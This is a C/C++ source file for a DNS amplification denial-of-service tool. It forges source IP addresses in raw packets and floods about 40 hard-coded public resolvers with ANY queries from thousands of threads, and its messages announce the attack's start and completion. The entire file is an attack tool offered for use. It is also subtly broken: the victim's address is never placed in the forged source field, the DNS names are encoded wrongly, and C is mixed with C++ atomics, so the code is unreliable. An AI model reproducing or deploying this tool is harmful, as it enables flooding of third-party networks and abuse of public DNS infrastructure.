#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <time.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <atomic>
#include <sys/time.h>
#include <netdb.h>
#include <ifaddrs.h>

#define MAX_THREADS 5000
#define STATUS_UPDATE_INTERVAL 2
#define DNS_QUERY_SIZE 512
#define MAX_DNS_SERVERS 500
#define MAX_DOMAINS 100
#define PACKETS_PER_SECOND 10000
#define MAX_PAYLOAD_SIZE 4096
#define DNS_PORT 53

typedef struct {
    int thread_id;
    std::atomic_ulong *packet_count;
    volatile int *running;
    char dns_server[16];
    char target_ip[16];
    int port;
    int query_id;
    int spoof_random_ip;
    int amplification_factor;
} thread_data_t;

typedef struct {
    char target_ip[16];
    int port;
    int duration;
    int thread_count;
    volatile int running;
    std::atomic_ulong total_packets;
    char dns_servers[MAX_DNS_SERVERS][16];
    int dns_server_count;
    int spoof_random_ip;
    int use_tcp;
    int verbose;
    int min_amplification;
    char dns_file[256];
} config_t;

config_t config;

struct dns_header {
    unsigned short id;
    unsigned short flags;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
};

// Function declarations
void print_banner(void);
void init_config(int argc, char *argv[]);
void validate_arguments(void);
void setup_signal_handlers(void);
void handle_signal(int sig);
void print_status(std::atomic_ulong *packet_counts, int thread_count);
void *dns_amplification_thread(void *arg);
unsigned long get_time_ms(void);
void load_dns_servers_from_file(const char *filename);
void load_dns_servers(void);
void create_dns_servers_files(void);
unsigned short checksum(unsigned short *ptr, int nbytes);
void generate_random_ip(char *ip);
void select_random_domain(char *qname, size_t qname_size);
int get_local_ip(char *buffer);
void setup_ip_header(struct iphdr *ip, const char *src_ip, const char *dst_ip, int packet_len);
void setup_udp_header(struct udphdr *udp, int src_port, int dst_port, int len);
void build_dns_query(char *buffer, int *len, int query_id);
void print_usage(char *program_name);
void validate_ip(const char *ip);
int is_root_user(void);

void print_banner(void) {
    printf("=========================================\n");
    printf("    ULTRA ADVANCED DNS AMPLIFICATION TOOL\n");
    printf("    AUTO-CONFIGURATION MODE\n");
    printf("=========================================\n");
}

void print_usage(char *program_name) {
    printf("Usage: %s <TARGET_IP> <PORT> <DURATION> [THREADS] [SPOOF]\n", program_name);
    printf("Simple mode: Just provide IP, port, duration, threads, and spoof option\n");
    printf("Example: %s 192.168.1.100 53 60 1000 1\n", program_name);
    printf("All configuration files will be generated automatically\n");
}

void init_config(int argc, char *argv[]) {
    if (argc < 4) {
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
    }
    
    // Set defaults
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_ip[sizeof(config.target_ip) - 1] = '\0';
    config.port = atoi(argv[2]);
    config.duration = atoi(argv[3]);
    config.thread_count = (argc > 4) ? atoi(argv[4]) : 1000;
    config.spoof_random_ip = (argc > 5) ? atoi(argv[5]) : 0;
    config.use_tcp = 0;
    config.verbose = 1;
    config.min_amplification = 20;
    config.running = 0;
    std::atomic_init(&config.total_packets, 0UL);
    config.dns_server_count = 0;
    strcpy(config.dns_file, "auto_dns_servers.txt");
    
    // Create all necessary files automatically
    create_dns_servers_files();
    
    // Load DNS servers from the auto-generated file
    load_dns_servers_from_file(config.dns_file);
}

void create_dns_servers_files(void) {
    printf("[+] Creating automatic configuration files...\n");
    
    // Create main DNS servers file
    FILE *file = fopen("auto_dns_servers.txt", "w");
    if (file) {
        fprintf(file, "8.8.8.8\n");
        fprintf(file, "8.8.4.4\n");
        fprintf(file, "1.1.1.1\n");
        fprintf(file, "1.0.0.1\n");
        fprintf(file, "9.9.9.9\n");
        fprintf(file, "149.112.112.112\n");
        fprintf(file, "208.67.222.222\n");
        fprintf(file, "208.67.220.220\n");
        fprintf(file, "64.6.64.6\n");
        fprintf(file, "64.6.65.6\n");
        fprintf(file, "84.200.69.80\n");
        fprintf(file, "84.200.70.40\n");
        fprintf(file, "8.26.56.26\n");
        fprintf(file, "8.20.247.20\n");
        fprintf(file, "195.46.39.39\n");
        fprintf(file, "195.46.39.40\n");
        fprintf(file, "77.88.8.8\n");
        fprintf(file, "77.88.8.1\n");
        fprintf(file, "176.103.130.130\n");
        fprintf(file, "176.103.130.131\n");
        fprintf(file, "156.154.70.1\n");
        fprintf(file, "156.154.71.1\n");
        fprintf(file, "185.228.168.9\n");
        fprintf(file, "185.228.169.9\n");
        fprintf(file, "76.76.19.19\n");
        fprintf(file, "76.223.122.150\n");
        fprintf(file, "94.140.14.14\n");
        fprintf(file, "94.140.15.15\n");
        fprintf(file, "4.2.2.1\n");
        fprintf(file, "4.2.2.2\n");
        fprintf(file, "4.2.2.3\n");
        fprintf(file, "4.2.2.4\n");
        fprintf(file, "4.2.2.5\n");
        fprintf(file, "4.2.2.6\n");
        fprintf(file, "80.80.80.80\n");
        fprintf(file, "80.80.81.81\n");
        fprintf(file, "89.233.43.71\n");
        fprintf(file, "91.239.100.100\n");
        fprintf(file, "74.82.42.42\n");
        fprintf(file, "109.69.8.51\n");
        fprintf(file, "5.2.75.75\n");
        fprintf(file, "5.2.75.76\n");
        fprintf(file, "209.244.0.3\n");
        fprintf(file, "209.244.0.4\n");
        fprintf(file, "216.146.35.35\n");
        fprintf(file, "216.146.36.36\n");
        fprintf(file, "37.235.1.174\n");
        fprintf(file, "37.235.1.177\n");
        fclose(file);
        printf("[+] Created auto_dns_servers.txt with 40 DNS servers\n");
    }
    
    // Create domains file
    file = fopen("auto_domains.txt", "w");
    if (file) {
        fprintf(file, "isc.org\n");
        fprintf(file, "ripe.net\n");
        fprintf(file, "akamai.net\n");
        fprintf(file, "nic.fr\n");
        fprintf(file, "google.com\n");
        fprintf(file, "youtube.com\n");
        fprintf(file, "facebook.com\n");
        fprintf(file, "apple.com\n");
        fprintf(file, "twitter.com\n");
        fprintf(file, "amazon.com\n");
        fprintf(file, "microsoft.com\n");
        fprintf(file, "netflix.com\n");
        fprintf(file, "cloudflare.com\n");
        fprintf(file, "openDNS.com\n");
        fprintf(file, "verisign.com\n");
        fclose(file);
        printf("[+] Created auto_domains.txt with 15 high-amplification domains\n");
    }
    
    // Create configuration summary
    file = fopen("attack_config.txt", "w");
    if (file) {
        fprintf(file, "Attack Configuration Summary\n");
        fprintf(file, "============================\n");
        fprintf(file, "Target IP: %s\n", config.target_ip);
        fprintf(file, "Target Port: %d\n", config.port);
        fprintf(file, "Duration: %d seconds\n", config.duration);
        fprintf(file, "Threads: %d\n", config.thread_count);
        fprintf(file, "IP Spoofing: %s\n", config.spoof_random_ip ? "Enabled" : "Disabled");
        fprintf(file, "Protocol: %s\n", config.use_tcp ? "TCP" : "UDP");
        fprintf(file, "Min Amplification: %dx\n", config.min_amplification);
        fprintf(file, "DNS Servers File: %s\n", config.dns_file);
        fprintf(file, "Domains File: auto_domains.txt\n");
        fclose(file);
        printf("[+] Created attack_config.txt with attack parameters\n");
    }
}

void load_dns_servers_from_file(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf("Warning: Could not open DNS servers file %s\n", filename);
        printf("Using built-in DNS servers list\n");
        load_dns_servers();
        return;
    }
    
    char line[128];
    while (fgets(line, sizeof(line), file) && config.dns_server_count < MAX_DNS_SERVERS) {
        // Remove newline character
        line[strcspn(line, "\r\n")] = 0;
        
        // Validate IP format
        struct in_addr addr;
        if (inet_pton(AF_INET, line, &addr) == 1) {
            strncpy(config.dns_servers[config.dns_server_count], line, 
                   sizeof(config.dns_servers[config.dns_server_count]) - 1);
            config.dns_servers[config.dns_server_count][sizeof(config.dns_servers[config.dns_server_count]) - 1] = '\0';
            config.dns_server_count++;
        }
    }
    
    fclose(file);
    printf("[+] Loaded %d DNS servers from %s\n", config.dns_server_count, filename);
}

void load_dns_servers(void) {
    const char *servers[] = {
        "8.8.8.8", "8.8.4.4",
        "1.1.1.1", "1.0.0.1",
        "9.9.9.9", "149.112.112.112",
        "208.67.222.222", "208.67.220.220",
        "64.6.64.6", "64.6.65.6",
        "84.200.69.80", "84.200.70.40",
        "8.26.56.26", "8.20.247.20",
        "195.46.39.39", "195.46.39.40",
        "77.88.8.8", "77.88.8.1",
        "176.103.130.130", "176.103.130.131",
        "156.154.70.1", "156.154.71.1",
        "185.228.168.9", "185.228.169.9",
        "76.76.19.19", "76.223.122.150",
        "94.140.14.14", "94.140.15.15"
    };
    
    int count = sizeof(servers) / sizeof(servers[0]);
    for (int i = 0; i < count && i < MAX_DNS_SERVERS; i++) {
        strncpy(config.dns_servers[i], servers[i], sizeof(config.dns_servers[i]) - 1);
        config.dns_servers[i][sizeof(config.dns_servers[i]) - 1] = '\0';
        config.dns_server_count++;
    }
    
    printf("[+] Loaded %d built-in DNS servers\n", config.dns_server_count);
}

void validate_arguments(void) {
    if (!is_root_user()) {
        fprintf(stderr, "Error: This program must be run as root for raw socket access\n");
        fprintf(stderr, "Run with: sudo %s <TARGET_IP> <PORT> <DURATION> [THREADS] [SPOOF]\n", 
                program_invocation_short_name);
        exit(EXIT_FAILURE);
    }
    
    if (config.duration < 1) {
        fprintf(stderr, "Error: Duration must be at least 1 second\n");
        exit(EXIT_FAILURE);
    }
    
    if (config.thread_count < 1 || config.thread_count > MAX_THREADS) {
        fprintf(stderr, "Error: Thread count must be between 1 and %d\n", MAX_THREADS);
        exit(EXIT_FAILURE);
    }
    
    if (config.port < 1 || config.port > 65535) {
        fprintf(stderr, "Error: Port must be between 1 and 65535\n");
        exit(EXIT_FAILURE);
    }
    
    validate_ip(config.target_ip);
    
    if (config.dns_server_count == 0) {
        fprintf(stderr, "Error: No DNS servers available\n");
        exit(EXIT_FAILURE);
    }
}

int is_root_user(void) {
    return geteuid() == 0;
}

void validate_ip(const char *ip) {
    struct in_addr addr;
    if (inet_pton(AF_INET, ip, &addr) != 1) {
        fprintf(stderr, "Error: Invalid IP address format: %s\n", ip);
        exit(EXIT_FAILURE);
    }
}

void setup_signal_handlers(void) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGPIPE, SIG_IGN);
}

void handle_signal(int sig) {
    printf("\n[!] Received signal %d, shutting down...\n", sig);
    config.running = 0;
}

void print_status(std::atomic_ulong *packet_counts, int thread_count) {
    static int update_count = 0;
    static unsigned long last_total = 0;
    unsigned long total = 0;
    
    for (int i = 0; i < thread_count; i++) {
        total += std::atomic_load(&packet_counts[i]);
    }
    
    time_t now = time(NULL);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%H:%M:%S", localtime(&now));
    
    unsigned long current_pps = (total - last_total) / STATUS_UPDATE_INTERVAL;
    last_total = total;
    
    printf("[%s] Packets: %lu | PPS: %lu | Threads: %d\n", 
           timestamp, total, current_pps, thread_count);
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    
    return answer;
}

void generate_random_ip(char *ip) {
    snprintf(ip, 16, "%d.%d.%d.%d", 
             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
}

void select_random_domain(char *qname, size_t qname_size) {
    const char *domains[] = {
        "\x07" "iscorg", "\x03" "org", "\x00",
        "\x04" "ripe", "\x03" "net", "\x00",
        "\x06" "google", "\x03" "com", "\x00",
        "\x06" "akamai", "\x03" "net", "\x00",
        "\x03" "nic", "\x02" "fr", "\x00",
        "\x06" "youtube", "\x03" "com", "\x00",
        "\x08" "facebook", "\x03" "com", "\x00",
        "\x05" "apple", "\x03" "com", "\x00",
        "\x07" "twitter", "\x03" "com", "\x00",
        "\x06" "amazon", "\x03" "com", "\x00"
    };
    
    int index = rand() % (sizeof(domains) / sizeof(domains[0]));
    size_t len = strlen(domains[index]) + 1;
    if (len > qname_size) {
        len = qname_size - 1;
    }
    strncpy(qname, domains[index], len);
    qname[len] = '\0';
}

int get_local_ip(char *buffer) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    struct sockaddr_in serv;
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);
    
    if (connect(sock, (const struct sockaddr*)&serv, sizeof(serv)) < 0) {
        close(sock);
        return -1;
    }
    
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    getsockname(sock, (struct sockaddr*)&name, &namelen);
    
    const char *local_ip = inet_ntoa(name.sin_addr);
    strncpy(buffer, local_ip, 15);
    buffer[15] = '\0';
    
    close(sock);
    return 0;
}

void setup_ip_header(struct iphdr *ip, const char *src_ip, const char *dst_ip, int packet_len) {
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(packet_len);
    ip->id = htons(rand() % 65535);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dst_ip);
    ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));
}

void setup_udp_header(struct udphdr *udp, int src_port, int dst_port, int len) {
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(len);
    udp->check = 0;
}

void build_dns_query(char *buffer, int *len, int query_id) {
    struct dns_header *dns_hdr = (struct dns_header *)buffer;
    
    dns_hdr->id = htons(query_id);
    dns_hdr->flags = htons(0x0100);
    dns_hdr->qdcount = htons(1);
    dns_hdr->ancount = 0;
    dns_hdr->nscount = 0;
    dns_hdr->arcount = 0;
    
    char *qname = buffer + sizeof(struct dns_header);
    select_random_domain(qname, DNS_QUERY_SIZE - sizeof(struct dns_header));
    
    unsigned short *qtype = (unsigned short *)(qname + strlen(qname) + 1);
    *qtype = htons(0x00ff);
    unsigned short *qclass = qtype + 1;
    *qclass = htons(0x0001);
    
    *len = sizeof(struct dns_header) + strlen(qname) + 1 + 4;
}

void *dns_amplification_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        fprintf(stderr, "Thread %d: Raw socket creation failed: %s\n", data->thread_id, strerror(errno));
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "Thread %d: setsockopt failed: %s\n", data->thread_id, strerror(errno));
        close(sock);
        return NULL;
    }
    
    char packet[MAX_PAYLOAD_SIZE];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    int query_len;
    build_dns_query(payload, &query_len, data->query_id);
    
    int src_port = 1024 + (rand() % 64512);
    int udp_len = sizeof(struct udphdr) + query_len;
    int packet_len = sizeof(struct iphdr) + udp_len;
    
    setup_udp_header(udp, src_port, data->port, udp_len);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(data->port);
    sin.sin_addr.s_addr = inet_addr(data->dns_server);
    
    struct timespec sleep_time;
    sleep_time.tv_sec = 0;
    sleep_time.tv_nsec = (1000000000 / PACKETS_PER_SECOND) / config.thread_count;
    
    char src_ip[16];
    char local_ip[16] = {0};
    
    if (!data->spoof_random_ip && get_local_ip(local_ip) < 0) {
        strncpy(local_ip, "127.0.0.1", sizeof(local_ip));
    }
    
    while (*(data->running)) {
        if (data->spoof_random_ip) {
            generate_random_ip(src_ip);
        } else {
            strncpy(src_ip, local_ip, sizeof(src_ip));
        }
        
        setup_ip_header(ip, src_ip, data->dns_server, packet_len);
        
        if (sendto(sock, packet, packet_len, 0, 
                  (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            std::atomic_fetch_add(data->packet_count, 1);
        }
        
        if (rand() % 100 < 5) {
            build_dns_query(payload, &query_len, rand() % 65535);
        }
        
        nanosleep(&sleep_time, NULL);
    }
    
    close(sock);
    return NULL;
}

unsigned long get_time_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (ts.tv_sec * 1000) + (ts.tv_nsec / 1000000);
}

int main(int argc, char *argv[]) {
    pthread_t *threads = NULL;
    thread_data_t *thread_data = NULL;
    std::atomic_ulong *packet_counts = NULL;
    unsigned long start_time, current_time, elapsed_time;
    
    print_banner();
    init_config(argc, argv);
    validate_arguments();
    setup_signal_handlers();
    
    printf("[+] Target: %s:%d\n", config.target_ip, config.port);
    printf("[+] Duration: %d seconds\n", config.duration);
    printf("[+] Threads: %d\n", config.thread_count);
    printf("[+] DNS Servers: %d\n", config.dns_server_count);
    printf("[+] Random IP Spoofing: %s\n", config.spoof_random_ip ? "Enabled" : "Disabled");
    printf("[+] Starting attack in 3 seconds...\n");
    sleep(3);
    
    threads = (pthread_t *)malloc(config.thread_count * sizeof(pthread_t));
    thread_data = (thread_data_t *)malloc(config.thread_count * sizeof(thread_data_t));
    packet_counts = (std::atomic_ulong *)malloc(config.thread_count * sizeof(std::atomic_ulong));
    
    if (!threads || !thread_data || !packet_counts) {
        perror("Memory allocation failed");
        free(threads);
        free(thread_data);
        free(packet_counts);
        return EXIT_FAILURE;
    }
    
    for (int i = 0; i < config.thread_count; i++) {
        std::atomic_init(&packet_counts[i], 0UL);
    }
    
    srand(time(NULL));
    for (int i = 0; i < config.thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].packet_count = &packet_counts[i];
        thread_data[i].running = &config.running;
        thread_data[i].query_id = rand() % 65535;
        thread_data[i].port = config.port;
        thread_data[i].spoof_random_ip = config.spoof_random_ip;
        thread_data[i].amplification_factor = 50 + (rand() % 50);
        
        strncpy(thread_data[i].dns_server, 
                config.dns_servers[i % config.dns_server_count],
                sizeof(thread_data[i].dns_server) - 1);
        thread_data[i].dns_server[sizeof(thread_data[i].dns_server) - 1] = '\0';
        
        strncpy(thread_data[i].target_ip, config.target_ip, sizeof(thread_data[i].target_ip) - 1);
        thread_data[i].target_ip[sizeof(thread_data[i].target_ip) - 1] = '\0';
        
        if (pthread_create(&threads[i], NULL, dns_amplification_thread, (void*)&thread_data[i]) != 0) {
            fprintf(stderr, "Thread %d creation failed: %s\n", i, strerror(errno));
            for (int j = 0; j < i; j++) {
                pthread_cancel(threads[j]);
            }
            free(threads);
            free(thread_data);
            free(packet_counts);
            return EXIT_FAILURE;
        }
    }
    
    config.running = 1;
    start_time = get_time_ms();
    
    while (config.running) {
        sleep(STATUS_UPDATE_INTERVAL);
        print_status(packet_counts, config.thread_count);
        
        current_time = get_time_ms();
        elapsed_time = (current_time - start_time) / 1000;
        
        if (elapsed_time >= config.duration) {
            config.running = 0;
            break;
        }
    }
    
    sleep(1);
    
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long total_packets = 0;
    for (int i = 0; i < config.thread_count; i++) {
        total_packets += std::atomic_load(&packet_counts[i]);
    }
    
    printf("\n[+] Attack completed!\n");
    printf("[+] Total spoofed DNS queries sent: %lu\n", total_packets);
    printf("[+] Average queries per second: %.2f\n", (float)total_packets / config.duration);
    printf("[+] Estimated bandwidth: %.2f Mbps\n", 
           (total_packets * 100.0 * 8) / (config.duration * 1000000.0));
    printf("[+] Configuration saved in: auto_dns_servers.txt, auto_domains.txt, attack_config.txt\n");
    
    free(threads);
    free(thread_data);
    free(packet_counts);
    
    return EXIT_SUCCESS;
}